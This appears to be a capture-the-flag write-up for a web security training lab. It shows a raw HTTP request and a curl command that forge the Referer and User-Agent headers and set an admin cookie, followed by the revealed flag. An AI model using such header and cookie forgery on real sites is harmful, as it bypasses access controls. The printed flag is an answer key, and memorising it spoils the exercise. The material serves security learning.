
Modifying HTTP requests with Burp Proxy

going through the html on the link `© BornToSec` at the bottom

You must come from : "https://www.nsa.gov/".

Let's use this browser : "ft_bornToSec". It will help you a lot.

```
GET /?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f HTTP/1.1
Host: 10.12.100.231
Upgrade-Insecure-Requests: 1
User-Agent: ft_bornToSec
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://www.nsa.gov/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: close
```

The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


======
Using Developers tool

```
Open the developer tools in your browser. You can do this by pressing F12 on Windows/Linux or Command + Option + I on Mac.

Go to the Network tab.

Make sure the Preserve log option is selected.

Refresh the page that you want to modify the Referer header for.

Find the request in the Network tab that you want to modify the Referer header for.

Look for the option to "Copy as cURL" or "Copy as Fetch" and paste the copied request to edit and resend it.
```

```
curl 'http://10.12.100.231/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
  -H 'Referer: https://www.nsa.gov/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: ft_bornToSec' \
  --compressed \
  --insecure | grep flag
```
```
<center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```
